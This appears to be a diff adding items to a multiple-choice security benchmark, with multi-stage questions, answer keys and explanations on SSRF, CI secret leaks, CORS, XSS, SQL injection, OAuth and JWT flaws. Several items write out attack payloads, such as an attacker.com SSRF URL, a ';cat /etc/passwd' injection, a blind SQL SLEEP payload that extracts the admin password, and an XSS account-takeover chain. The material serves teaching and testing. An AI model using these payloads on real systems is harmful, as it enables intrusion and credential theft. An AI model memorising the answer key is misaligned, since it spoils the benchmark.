+        "D": "Stage 1: A10:2021 - SSRF. Stage 2: Use http://internal-api:8080@attacker.com (URL with credentials), DNS rebinding, or register a domain like http://internal.attacker.com. Stage 3: URL allowlist of permitted domains/IPs, resolve DNS and verify against allowlist, disable HTTP redirects, use a dedicated egress proxy with network-level controls."
+      },
+      "answer": "D",
+      "explanation": "Stage 1: SSRF (A10:2021) - the server is tricked into making requests to internal resources. Stage 2: The startswith check is trivially bypassed by URL authority tricks, DNS rebinding, or subdomains. Stage 3: Defense requires multiple layers: URL/IP allowlisting after DNS resolution, blocking private IP ranges (RFC 1918), disabling redirects, and network segmentation.",
+      "topic": "ssrf_bypass_chain",
+      "topic_category": "owasp_top10",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC078",
+      "question": "A CI/CD pipeline uses GitHub Actions with this workflow:\n\nname: Deploy\non: pull_request_target\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - run: npm install && npm run build\n      - run: ./deploy.sh\n        env:\n          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_KEY }}\n\nStage 1: What is the critical vulnerability in this workflow? Stage 2: Why is pull_request_target more dangerous than pull_request? Stage 3: What is the secure pattern?",
+      "choices": {
+        "A": "Stage 1: AWS_SECRET_ACCESS_KEY should not be in environment variables. Stage 2: pull_request_target triggers on all PRs. Stage 3: Use OIDC instead of secrets.",
+        "B": "Stage 1: npm install is not using --production flag. Stage 2: pull_request_target runs on a different OS. Stage 3: Pin npm versions.",
+        "C": "Stage 1: The workflow uses pull_request_target (which has access to secrets) but checks out the PR author's untrusted code, allowing arbitrary code execution with secret access. Stage 2: pull_request_target runs in the context of the base branch with full secrets access, unlike pull_request which runs in a restricted fork context without secrets. Stage 3: Split into two workflows: a pull_request workflow for build/test (no secrets) and a separate workflow triggered after manual approval or merge for deployment (with secrets).",
+        "D": "Stage 1: actions/checkout@v4 might be compromised. Stage 2: No difference between the two. Stage 3: Pin the checkout action to a SHA."
+      },
+      "answer": "C",
+      "explanation": "Stage 1: pull_request_target + checkout of PR head = untrusted code running with secrets. A malicious PR can modify build scripts to exfiltrate AWS_SECRET_ACCESS_KEY. Stage 2: pull_request from forks does not receive secrets; pull_request_target does. Stage 3: Never check out untrusted code in a context that has access to secrets. Separate privileged and unprivileged steps.",
+      "topic": "github_actions_secret_exfil",
+      "topic_category": "supply_chain",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC079",
+      "question": "A Flask application implements CSRF protection using a token in a hidden form field. The application also has this CORS configuration:\n\n@app.after_request\ndef add_cors(response):\n    origin = request.headers.get('Origin', '')\n    if '.example.com' in origin:\n        response.headers['Access-Control-Allow-Origin'] = origin\n        response.headers['Access-Control-Allow-Credentials'] = 'true'\n    return response\n\nStage 1: What is wrong with the origin validation? Stage 2: How does this CORS misconfiguration enable CSRF bypass? Stage 3: What is the complete fix?",
+      "choices": {
+        "A": "Stage 1: The substring check '.example.com' also matches attacker-controlled domains like evil.example.com.attacker.com or notexample.com. Stage 2: An attacker's page at evil.example.com.attacker.com can make credentialed cross-origin requests, read the CSRF token from the response, and submit a forged request with the valid token. Stage 3: Use strict origin comparison against an allowlist of exact origins; parse the Origin header as a URL and compare the full host.",
+        "B": "Stage 1: No issue; subdomain matching is correct. Stage 2: CORS bypass is not possible. Stage 3: Add rate limiting.",
+        "C": "Stage 1: The CORS header should be set in nginx, not Flask. Stage 2: Flask CORS does not work. Stage 3: Move CORS to the reverse proxy.",
+        "D": "Stage 1: The check should use endswith instead of 'in'. Stage 2: CORS does not affect CSRF. Stage 3: Use SameSite cookies."
+      },
+      "answer": "A",
+      "explanation": "Stage 1: 'in' check matches any string containing '.example.com', including attacker-controlled origins. Stage 2: With credentials allowed and origin reflected, the attacker's page can fetch the CSRF-protected page, extract the token from the HTML, and submit the form with the stolen token. Stage 3: Exact origin matching against an allowlist, and use SameSite cookies as defense-in-depth.",
+      "topic": "cors_csrf_bypass_chain",
+      "topic_category": "auth",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC080",
+      "question": "A Python web application uses Jinja2 with autoescape enabled. A developer writes:\n\n@app.route('/profile')\ndef profile():\n    bio = get_user_bio()  # from database, user-controlled\n    return render_template('profile.html', bio=bio)\n\nIn profile.html: <div>{{ bio | safe }}</div>\n\nStage 1: What vulnerability exists despite autoescaping being enabled? Stage 2: The developer removes the 'safe' filter and instead stores sanitized HTML using bleach.clean(bio, tags=['b','i','a'], attributes={'a': ['href']}). Is this sufficient? Stage 3: What additional control is needed on the bleach allowlist?",
+      "choices": {
+        "A": "Stage 1: No vulnerability; autoescape handles it. Stage 2: Yes, bleach is sufficient. Stage 3: No additional controls needed.",
+        "B": "Stage 1: The |safe filter disables autoescaping for that variable, allowing stored XSS from the user-controlled bio field. Stage 2: Almost, but the 'href' attribute on 'a' tags allows javascript: protocol URIs, enabling XSS via <a href='javascript:alert(1)'>click</a>. Stage 3: Add protocols=['http','https'] to bleach.clean() to restrict href to safe protocols, or use bleach.linkifier with url_re.",
+        "C": "Stage 1: SQL injection in get_user_bio(). Stage 2: Yes, if SQL is parameterized. Stage 3: Add CSRF protection.",
+        "D": "Stage 1: Path traversal via bio field. Stage 2: No, bleach has known bypasses. Stage 3: Use a WAF instead."
+      },
+      "answer": "B",
+      "explanation": "Stage 1: |safe explicitly marks content as safe, bypassing Jinja2's autoescaping. User-controlled content rendered with |safe is a stored XSS vulnerability. Stage 2: bleach.clean with allowed tags is good, but without protocol restrictions, href attributes can use javascript: URIs. Stage 3: Restrict protocols to http/https to prevent javascript: and data: URI XSS vectors.",
+      "topic": "jinja2_safe_filter_xss_chain",
+      "topic_category": "injection",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC081",
+      "question": "An application stores session tokens in cookies with these attributes: HttpOnly; Secure; SameSite=Lax; Path=/. Stage 1: Can an attacker steal this cookie via XSS? Stage 2: With SameSite=Lax, which cross-site request methods will include the cookie? Stage 3: A developer changes to SameSite=None to support cross-site iframe embedding. What additional attack surface does this open?",
+      "choices": {
+        "A": "Stage 1: No, HttpOnly prevents JavaScript from reading the cookie, but XSS can still make authenticated requests using the cookie (the attacker cannot exfiltrate it but can act on behalf of the user). Stage 2: Lax sends cookies on top-level navigations (GET links, form GETs) but NOT on cross-site POST, PUT, DELETE, or subresource requests (images, iframes, XHR). Stage 3: SameSite=None (with Secure) sends the cookie on ALL cross-site requests, re-enabling traditional CSRF on POST/PUT/DELETE endpoints and requiring anti-CSRF tokens.",
+        "B": "Stage 1: Yes, XSS can read HttpOnly cookies via document.cookie. Stage 2: Lax only affects third-party iframes. Stage 3: Adding CORS fixes the issue.",
+        "C": "Stage 1: Yes, HttpOnly only prevents reading, not stealing via network interception. Stage 2: Lax sends cookies on all GET requests. Stage 3: No additional attack surface with Secure flag.",
+        "D": "Stage 1: No, HttpOnly completely prevents XSS exploitation. Stage 2: Lax blocks all cross-site cookies. Stage 3: SameSite=None is equivalent to not setting SameSite."
+      },
+      "answer": "A",
+      "explanation": "Stage 1: HttpOnly prevents document.cookie access but XSS can still make fetch/XMLHttpRequest calls that automatically include the cookie. Stage 2: Lax is the key nuance - top-level GET navigations include cookies, but cross-site POSTs do not. Stage 3: SameSite=None removes all cross-site cookie restrictions, making CSRF viable again on state-changing endpoints.",
+      "topic": "cookie_samesite_attack_surface",
+      "topic_category": "web_headers",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC082",
+      "question": "A security review finds this Python code for an admin API:\n\nimport hashlib, os\n\ndef verify_webhook(payload, signature, secret):\n    expected = hashlib.sha256(secret.encode() + payload.encode()).hexdigest()\n    return expected == signature\n\nStage 1: Identify two security issues in this verification function. Stage 2: Why is simple string comparison (==) dangerous for signature verification? Stage 3: Write the corrected implementation.",
+      "choices": {
+        "A": "Stage 1: (1) Uses SHA-256(secret+payload) which is vulnerable to length extension attacks; should use HMAC. (2) Uses string equality (==) which is vulnerable to timing attacks. Stage 2: String == compares character-by-character and returns False on the first mismatch, leaking how many leading characters match via response time differences. Stage 3: Use hmac.new(secret, payload, hashlib.sha256).hexdigest() with hmac.compare_digest(expected, signature) for constant-time comparison.",
+        "B": "Stage 1: (1) The secret should be hashed first. (2) hexdigest is lossy. Stage 2: Python strings are immutable. Stage 3: Use base64 encoding instead of hex.",
+        "C": "Stage 1: (1) SHA-256 is deprecated. (2) os is imported but unused. Stage 2: String comparison is case-sensitive. Stage 3: Use bcrypt for webhook signatures.",
+        "D": "Stage 1: (1) encode() uses wrong encoding. (2) No salt is used. Stage 2: Unicode comparison issues. Stage 3: Add a salt parameter."
+      },
+      "answer": "A",
+      "explanation": "Stage 1: Hash(secret||message) is vulnerable to length extension (the attacker can compute Hash(secret||message||extension) without knowing the secret). HMAC uses a proper keyed-hash construction immune to this. Stage 2: Timing side-channel leaks the correct prefix length. Stage 3: hmac.new() + hmac.compare_digest() is the standard secure pattern.",
+      "topic": "hmac_timing_attack_chain",
+      "topic_category": "cryptography",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC083",
+      "question": "An organization runs a Python application in Docker with this Dockerfile:\n\nFROM python:3.11\nCOPY . /app\nWORKDIR /app\nRUN pip install -r requirements.txt\nCMD [\"python\", \"app.py\"]\n\nThe application connects to a PostgreSQL database using credentials from environment variables. Stage 1: Identify three security issues with this Dockerfile. Stage 2: The application logs database query errors including the full connection string. What is the risk? Stage 3: Provide the security-hardened Dockerfile and logging fix.",
+      "choices": {
+        "A": "Stage 1: (1) No volume mounts. (2) WORKDIR should be /opt. (3) requirements.txt might be missing. Stage 2: Log rotation prevents credential exposure. Stage 3: Add volume mounts and fix WORKDIR.",
+        "B": "Stage 1: (1) Python 3.11 is outdated. (2) pip install without --upgrade. (3) No multi-stage build. Stage 2: Query errors expose table structure. Stage 3: Use Python 3.12 and multi-stage builds.",
+        "C": "Stage 1: (1) Uses full python:3.11 image (large attack surface, many unnecessary packages). (2) Runs as root (no USER directive). (3) Copies entire project including potentially sensitive files (.env, .git, secrets). Stage 2: Connection strings in logs expose database credentials to anyone with log access (centralized logging systems, log aggregation services, crash reporters). Stage 3: Use python:3.11-slim or alpine, add a non-root USER, use .dockerignore, and sanitize error logs to redact connection strings before logging.",
+        "D": "Stage 1: (1) No EXPOSE directive. (2) No HEALTHCHECK. (3) Uses CMD not ENTRYPOINT. Stage 2: No risk if logs are internal. Stage 3: Add EXPOSE and HEALTHCHECK."
+      },
+      "answer": "C",
+      "explanation": "Stage 1: Root user means container escape gives host root. Full image includes compilers, shells, and tools attackers can use. COPY . includes everything not in .dockerignore. Stage 2: Credentials in logs is a CWE-532 (Insertion of Sensitive Information into Log File) violation. Stage 3: Minimal base image + non-root user + .dockerignore + log sanitization.",
+      "topic": "docker_security_hardening_chain",
+      "topic_category": "infrastructure",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC084",
+      "question": "A web application implements rate limiting on its /login endpoint (5 attempts per IP per minute). Stage 1: How can an attacker bypass IP-based rate limiting? Stage 2: The developer adds account-based rate limiting (5 attempts per account per minute). How can the attacker now perform a credential stuffing attack? Stage 3: What is a comprehensive rate limiting strategy that addresses both bypass techniques?",
+      "choices": {
+        "A": "Stage 1: Use rotating proxies, cloud functions, or distributed botnets to source requests from many IPs. Stage 2: Use a different target account for each attempt (reverse brute force / password spraying: try one common password against thousands of accounts). Stage 3: Combine IP-based, account-based, and global rate limits; add progressive delays and CAPTCHA after failed attempts; implement device fingerprinting; monitor for distributed patterns; use breached credential detection.",
+        "B": "Stage 1: Change the User-Agent header. Stage 2: Use different browsers. Stage 3: Add a WAF.",
+        "C": "Stage 1: Use IPv6. Stage 2: Create new accounts. Stage 3: Require MFA for all accounts.",
+        "D": "Stage 1: Use a VPN. Stage 2: Try faster within the time window. Stage 3: Reduce the rate limit to 1 attempt per minute."
+      },
+      "answer": "A",
+      "explanation": "Stage 1: IP rotation is cheap with cloud infrastructure, making IP-only rate limiting insufficient. Stage 2: Password spraying tries few passwords per account but many accounts, staying under per-account limits. Stage 3: Multi-dimensional rate limiting (IP + account + global), progressive delays, CAPTCHA, device fingerprinting, and checking against breached credential databases.",
+      "topic": "rate_limiting_bypass_chain",
+      "topic_category": "auth",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC085",
+      "question": "A developer implements a secret scanning pre-commit hook using regex patterns. The hook correctly catches patterns like AWS_SECRET_ACCESS_KEY=AKIA... but fails to detect a secret in this commit:\n\nconfig.py:\ndb_password = base64.b64decode('cGFzc3dvcmQxMjM=').decode()\n\nStage 1: Why did the regex-based scanner miss this? Stage 2: What type of secret encoding/obfuscation techniques commonly bypass regex scanners? Stage 3: What defense-in-depth approach should be used beyond pre-commit scanning?",
+      "choices": {
+        "A": "Stage 1: The variable name does not match 'SECRET' or 'KEY'. Stage 2: Using different variable names. Stage 3: Ban the base64 module.",
+        "B": "Stage 1: base64 is a standard library, not a secret. Stage 2: Encryption and compression. Stage 3: Code review only.",
+        "C": "Stage 1: The secret is Base64-encoded, not matching plaintext patterns for passwords or known credential formats. Stage 2: Base64, hex encoding, string concatenation ('pass' + 'word'), environment variable indirection, encrypted config files committed with keys nearby, Unicode homoglyphs, and multi-line string splitting. Stage 3: Layer pre-commit hooks with entropy-based scanning (detect-secrets), CI pipeline scanning, runtime secret detection in logs, vault-based secret management (no secrets in code at all), and periodic full-repository history scans.",
+        "D": "Stage 1: The hook does not scan .py files. Stage 2: Only Base64 bypasses scanners. Stage 3: Use a WAF."
+      },
+      "answer": "C",
+      "explanation": "Stage 1: Regex patterns match known credential formats in plaintext; encoding transforms the secret to bypass pattern matching. Stage 2: Multiple encoding and obfuscation techniques exist. Stage 3: No single scanning approach catches everything; defense-in-depth combines multiple detection methods plus the architectural goal of eliminating secrets from code entirely via vault integration.",
+      "topic": "secret_scanning_bypass_chain",
+      "topic_category": "secrets_management",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC086",
+      "question": "A Python Django application has this view:\n\nfrom django.http import HttpResponse\nimport subprocess\n\ndef ping_host(request):\n    host = request.GET.get('host', '')\n    if not host.replace('.', '').replace(':', '').isalnum():\n        return HttpResponse('Invalid host', status=400)\n    result = subprocess.run(f'ping -c 3 {host}', shell=True, capture_output=True, text=True)\n    return HttpResponse(f'<pre>{result.stdout}</pre>')\n\nStage 1: Identify the injection vulnerability despite the input validation. Stage 2: Construct a payload that bypasses the validation and reads /etc/passwd. Stage 3: Provide the corrected code.",
+      "choices": {
+        "A": "Stage 1: The host parameter allows semicolons. Stage 2: host=;cat /etc/passwd. Stage 3: Block semicolons.",
+        "B": "Stage 1: The replace().isalnum() check allows all characters. Stage 2: host=|cat /etc/passwd. Stage 3: Use a WAF.",
+        "C": "Stage 1: The validation allows colons and dots, and isalnum after stripping those permits hostnames, but IPv6 addresses with embedded payloads or certain Unicode normalization could bypass it. However the primary issue is shell=True combined with string formatting even with validation. Stage 2: The validation is actually robust for ASCII; the real fix is architectural. Stage 3: Use subprocess.run(['ping', '-c', '3', host], shell=False) to eliminate shell interpretation entirely, plus validate host against an IP/hostname regex.",
+        "D": "Stage 1: subprocess.run is always vulnerable. Stage 2: Any payload works. Stage 3: Use os.system instead."
+      },
+      "answer": "C",
+      "explanation": "Stage 1: While the specific validation blocks many shell metacharacters (;|&`$), the architectural flaw is shell=True with string formatting. Validation is a blocklist approach that may miss edge cases. Stage 2: The current validation is actually fairly restrictive, but relying on it is fragile. Stage 3: shell=False with list arguments eliminates the injection class entirely regardless of input validation quality.",
+      "topic": "command_injection_validation_bypass",
+      "topic_category": "injection",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC087",
+      "question": "An application uses OAuth 2.0 Authorization Code flow. During a security audit, you find the redirect_uri validation uses startsWith matching: if redirect_uri.startswith('https://app.example.com/callback'). Stage 1: How can an attacker exploit this? Stage 2: After redirecting the authorization code to their server, what can the attacker do? Stage 3: What is the correct redirect_uri validation?",
+      "choices": {
+        "A": "Stage 1: Register a redirect_uri like https://app.example.com/callback.attacker.com or https://app.example.com/callback/../attacker-path that matches the prefix but sends the code to the attacker. Stage 2: Exchange the authorization code for an access token at the token endpoint (if the client is a public client or the attacker knows the client_secret), gaining full API access as the victim. Stage 3: Exact string match of the full redirect_uri against a pre-registered allowlist; no prefix matching, no wildcard matching.",
+        "B": "Stage 1: Add extra query parameters. Stage 2: Modify the scope. Stage 3: Validate query parameters.",
+        "C": "Stage 1: Use HTTP instead of HTTPS. Stage 2: Intercept the code via MitM. Stage 3: Enforce HTTPS only.",
+        "D": "Stage 1: Inject JavaScript in the redirect_uri. Stage 2: Steal the access token from the URL. Stage 3: URL-encode the redirect_uri."
+      },
+      "answer": "A",
+      "explanation": "Stage 1: Prefix matching allows open redirects to attacker-controlled subpaths or lookalike domains. Stage 2: With the authorization code, the attacker can exchange it for tokens (code is the key). PKCE mitigates this for public clients but not confidential clients with compromised secrets. Stage 3: RFC 6749 section 3.1.2.3 requires exact match of the complete redirect URI.",
+      "topic": "oauth_redirect_uri_bypass_chain",
+      "topic_category": "auth",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC088",
+      "question": "A security team discovers a time-based blind SQL injection in a login form. The application uses MySQL and prepared statements for most queries, but the ORDER BY clause is dynamically constructed:\n\norder = request.args.get('sort', 'username')\nquery = f\"SELECT * FROM users ORDER BY {order}\"\ndb.execute(query)\n\nStage 1: Why can't ORDER BY use parameterized queries? Stage 2: Construct a time-based blind injection payload for this ORDER BY clause. Stage 3: What is the secure alternative for dynamic sorting?",
+      "choices": {
+        "A": "Stage 1: SQL parameterization treats parameters as data values, not identifiers. Column names and ORDER BY expressions cannot be parameterized because they define query structure, not data. Stage 2: (CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' THEN SLEEP(2) ELSE 0 END) extracts the admin password one character at a time via response timing. Stage 3: Whitelist allowed column names in application code: ALLOWED_SORTS = {'username', 'email', 'created'}; if order not in ALLOWED_SORTS: order = 'username'.",
+        "B": "Stage 1: ORDER BY can be parameterized in MySQL 8+. Stage 2: ORDER BY 1; SLEEP(2)--. Stage 3: Use an ORM's order_by method.",
+        "C": "Stage 1: It is a driver limitation. Stage 2: ORDER BY username; DROP TABLE users--. Stage 3: Escape the column name.",
+        "D": "Stage 1: ORDER BY is processed after WHERE, so it cannot be parameterized. Stage 2: ORDER BY IF(1=1, username, email). Stage 3: Remove sorting functionality."
+      },
+      "answer": "A",
+      "explanation": "Stage 1: Parameters are quoted as literal values; 'username' would be interpreted as the string 'username' not the column. Stage 2: Conditional CASE with SLEEP() allows character-by-character extraction via timing. Stage 3: Allowlisting is the only safe approach for dynamic identifiers; the application maps user input to a fixed set of valid column names.",
+      "topic": "order_by_blind_sqli_chain",
+      "topic_category": "injection",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC089",
+      "question": "A microservices architecture uses internal JWTs for service-to-service authentication. Service A issues JWTs with claims {\"service\":\"A\",\"role\":\"reader\"}. Service B accepts any JWT signed with the shared HMAC key. Stage 1: What privilege escalation attack is possible? Stage 2: An attacker compromises Service A (reader-only). What is the blast radius? Stage 3: Redesign the authentication to minimize blast radius.",
+      "choices": {
+        "A": "Stage 1: Service A can read Service B's data. Stage 2: Data in Service B is exposed. Stage 3: Encrypt JWT payloads.",
+        "B": "Stage 1: JWT replay between services. Stage 2: Only Service A is affected. Stage 3: Add token expiry.",
+        "C": "Stage 1: Service A can forge JWTs with arbitrary claims (e.g., {\"service\":\"A\",\"role\":\"admin\"}) because all services share the same signing key. Any service with the key can impersonate any other service with any role. Stage 2: The attacker has the shared HMAC key, so they can forge tokens for ALL services with ANY role, achieving full lateral movement across the entire microservices architecture. Stage 3: Use asymmetric keys (RS256): a central identity service holds the private key and issues scoped JWTs; individual services only have the public key for verification and cannot forge tokens. Add audience (aud) claims to prevent token reuse across services.",
+        "D": "Stage 1: Man-in-the-middle between services. Stage 2: Network traffic between A and B is exposed. Stage 3: Use mTLS."
+      },
+      "answer": "C",
+      "explanation": "Stage 1: Shared symmetric keys mean any key holder can forge any token. Stage 2: One compromised service = all services compromised (symmetric key = master key). Stage 3: Asymmetric JWT (central issuer with private key, services have public key only) + scoped audience claims limits blast radius. mTLS adds transport-level identity but does not address claim forgery.",
+      "topic": "jwt_shared_key_lateral_movement",
+      "topic_category": "auth",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC090",
+      "question": "A Python application uses f-strings for logging:\n\nimport logging\nlogger = logging.getLogger(__name__)\n\ndef process_order(user_input):\n    logger.info(f'Processing order: {user_input}')\n    # ... process ...\n\nSeparately, the logging configuration sends logs to an ELK stack. Stage 1: What injection attack is possible through the log message? Stage 2: If the ELK stack uses Logstash with a grok filter that parses log fields, how can the attacker escalate? Stage 3: What is the logging best practice that prevents both issues?",
+      "choices": {
+        "A": "Stage 1: Log injection via newline characters (\\n, \\r) in user_input allows forging fake log entries, potentially hiding malicious activity or injecting false audit trails. Stage 2: If Logstash grok patterns are not strict, the attacker can inject structured data that manipulates parsed fields, potentially triggering downstream alerts, corrupting dashboards, or exploiting Logstash pipeline vulnerabilities. Stage 3: Use structured logging (JSON format) with user input as a named field (logger.info('Processing order', extra={'order_data': user_input})), sanitize control characters, and configure Logstash to parse JSON rather than grok-matching unstructured text.",
+        "B": "Stage 1: Buffer overflow from long messages. Stage 2: Logstash crashes. Stage 3: Limit message length.",
+        "C": "Stage 1: SQL injection through log messages. Stage 2: The ELK stack database is compromised. Stage 3: Use print() instead of logging.",
+        "D": "Stage 1: XSS in the log viewer. Stage 2: Admin session hijacking. Stage 3: HTML-encode log messages."
+      },
+      "answer": "A",
+      "explanation": "Stage 1: Unstructured text logging with user input enables log forging via CRLF injection. Stage 2: Downstream log processors that parse unstructured text are vulnerable to field injection/manipulation. Stage 3: Structured logging (JSON) treats user input as data, not structure, preventing both injection and downstream parsing manipulation.",
+      "topic": "log_injection_elk_chain",
+      "topic_category": "injection",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC091",
+      "question": "An organization uses HashiCorp Vault for secrets management. A developer creates a Vault policy:\n\npath \"secret/data/myapp/*\" {\n  capabilities = [\"read\", \"list\"]\n}\n\nThe application authenticates to Vault using an AppRole with this policy. Stage 1: What is the security advantage of this over environment variables? Stage 2: The developer hardcodes the Vault role_id and secret_id in the application's config file. What security issue does this create? Stage 3: How should AppRole authentication be bootstrapped securely?",
+      "choices": {
+        "A": "Stage 1: Vault is faster than environment variable lookup. Stage 2: The policy is too permissive. Stage 3: Use the root token for authentication.",
+        "B": "Stage 1: Vault provides dynamic secrets with automatic rotation, audit logging of all access, fine-grained ACLs, lease-based expiry, and centralized revocation -- none of which environment variables offer. Stage 2: Hardcoding role_id and secret_id in config defeats the purpose; the config file IS now the secret, equivalent to storing passwords in config. If the file leaks, the attacker can authenticate to Vault and read all secrets at path secret/data/myapp/*. Stage 3: Deliver role_id via configuration management (trusted by platform) and secret_id via a separate secure channel with response wrapping (single-use token that expires). In cloud environments, use platform-native auth (AWS IAM, GCP service account) to eliminate bootstrap credentials entirely.",
+        "C": "Stage 1: Vault encrypts secrets at rest. Stage 2: No issue; AppRole credentials are not secrets. Stage 3: Store AppRole credentials in environment variables.",
+        "D": "Stage 1: Vault supports key rotation. Stage 2: The config file needs encryption. Stage 3: Encrypt the config file with GPG."
+      },
+      "answer": "B",
+      "explanation": "Stage 1: Vault provides a comprehensive secrets management lifecycle. Stage 2: The 'secret zero' problem -- you must authenticate to get secrets, but the authentication credential is itself a secret. Hardcoding it in a file is the same as hardcoding any other secret. Stage 3: Response wrapping and platform-native auth methods solve the bootstrap problem.",
+      "topic": "vault_approle_bootstrap_chain",
+      "topic_category": "secrets_management",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC092",
+      "question": "A penetration test reveals that a web application's CSP is: Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline'. Stage 1: Is this CSP sufficient to prevent XSS? Stage 2: How can an attacker exploit the cdn.jsdelivr.net allowlist? Stage 3: What CSP strategy prevents this class of bypass?",
+      "choices": {
+        "A": "Stage 1: Yes, 'self' plus a CDN is sufficient. Stage 2: jsdelivr cannot serve malicious content. Stage 3: Add 'unsafe-eval' for compatibility.",
+        "B": "Stage 1: No, because default-src should be 'none'. Stage 2: MitM the CDN connection. Stage 3: Use Subresource Integrity (SRI).",
+        "C": "Stage 1: No, because 'unsafe-inline' on styles is the issue. Stage 2: Not exploitable via jsdelivr. Stage 3: Remove 'unsafe-inline' from style-src.",
+        "D": "Stage 1: No. While it blocks inline scripts and most external sources, allowlisting an entire CDN origin is dangerous. Stage 2: jsdelivr.net hosts arbitrary user-uploaded npm packages and GitHub files. An attacker can publish a malicious npm package containing JavaScript, then use the jsdelivr URL (https://cdn.jsdelivr.net/npm/evil-package/payload.js) as the script source -- it passes CSP because the origin is allowlisted. Stage 3: Use CSP nonces (script-src 'nonce-{random}') or hashes (script-src 'sha256-{hash}') instead of origin allowlists. Nonces are generated per-response and attached to legitimate script tags; attacker-injected scripts cannot guess the nonce."
+      },
+      "answer": "D",
+      "explanation": "Stage 1: CDN origin allowlists are a well-known CSP bypass vector. Stage 2: Public CDNs serve user-uploaded content from a single origin, making them script gadget libraries for CSP bypass. Stage 3: Nonce-based CSP eliminates this class of attack because each legitimate script requires a per-request random nonce that cannot be predicted by an attacker.",
+      "topic": "csp_cdn_bypass_chain",
+      "topic_category": "web_headers",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC093",
+      "question": "During a threat modeling exercise using STRIDE, the team analyzes a data flow where a mobile app sends user location data to a backend API over HTTPS, which stores it in a database. Stage 1: Apply each STRIDE category to this data flow and identify one specific threat per category. Stage 2: Which two STRIDE categories pose the highest risk for this specific scenario? Stage 3: What mitigations address those two highest risks?",
+      "choices": {
+        "A": "Stage 1: Only Tampering and DoS apply. Stage 2: DoS is highest risk. Stage 3: Add rate limiting and DDoS protection.",
+        "B": "Stage 1: Spoofing (attacker impersonates a user to submit fake locations), Tampering (attacker modifies location data in transit or at rest), Repudiation (user denies sending location data), Information Disclosure (location data leaked from database or logs), DoS (flooding the API with location updates), Elevation of Privilege (accessing another user's location data). Stage 2: Information Disclosure (location is sensitive PII) and Spoofing (fake location data undermines the system's purpose). Stage 3: Information Disclosure: encrypt location data at rest, apply column-level encryption, minimize retention period, implement strict access controls and audit logging. Spoofing: device attestation (Android SafetyNet/iOS DeviceCheck), certificate pinning, rate limiting per device, anomaly detection on location jumps.",
+        "C": "Stage 1: Spoofing and Information Disclosure only. Stage 2: Both are equal. Stage 3: Use HTTPS.",
+        "D": "Stage 1: STRIDE only applies to internal systems. Stage 2: All categories are equal risk. Stage 3: Use a VPN."
+      },
+      "answer": "B",
+      "explanation": "Stage 1: All six STRIDE categories apply to most data flows; threat modeling requires considering each one. Stage 2: Location data is highly sensitive PII (Information Disclosure), and location spoofing can undermine business logic (Spoofing). Stage 3: Defense-in-depth combining encryption, access control, device attestation, and anomaly detection.",
+      "topic": "stride_location_data_analysis",
+      "topic_category": "threat_modeling",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC094",
+      "question": "A Flask application implements an admin panel with these three security controls:\n1. @login_required decorator checking session cookie\n2. CSRF token in all forms\n3. CSP: script-src 'self'\n\nAn attacker discovers a stored XSS vulnerability in the user profile 'bio' field (rendered on the admin dashboard without escaping). Stage 1: Which of the three controls does stored XSS bypass? Stage 2: Construct a complete attack chain from XSS to admin account takeover. Stage 3: What defense would have prevented this entire chain?",
+      "choices": {
+        "A": "Stage 1: XSS only bypasses CSRF. Stage 2: The attacker submits forms. Stage 3: Double-submit cookie pattern.",
+        "B": "Stage 1: XSS bypasses all three: (1) the attacker's script runs in the admin's authenticated session, (2) JavaScript can read CSRF tokens from the DOM, (3) the XSS payload is served from 'self' (stored in the database, rendered by the app server) so it satisfies the CSP. Stage 2: The stored XSS executes when admin views the dashboard. The script: reads the CSRF token from a hidden form field, makes a fetch() request to /admin/change-password with the CSRF token and a new password, or creates a new admin account. The admin's session cookie is automatically included. Stage 3: Output encoding/escaping of user content when rendering HTML. Autoescape in Jinja2 ({{ bio }} not {{ bio | safe }}) would have prevented the XSS from executing, breaking the entire chain at its root.",
+        "C": "Stage 1: XSS only bypasses CSP. Stage 2: The attacker steals the session cookie. Stage 3: HttpOnly cookies.",
+        "D": "Stage 1: XSS does not bypass any controls. Stage 2: No attack chain is possible. Stage 3: The existing controls are sufficient."
+      },
+      "answer": "B",
+      "explanation": "Stage 1: Stored XSS from 'self' bypasses CSP (same origin), operates within the authenticated session (bypasses login_required), and can read CSRF tokens from the page (bypasses CSRF protection). Stage 2: Full account takeover via password change or admin creation. Stage 3: Output encoding is the root defense; XSS prevention stops the entire attack chain.",
+      "topic": "stored_xss_control_bypass_chain",
+      "topic_category": "injection",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC095",
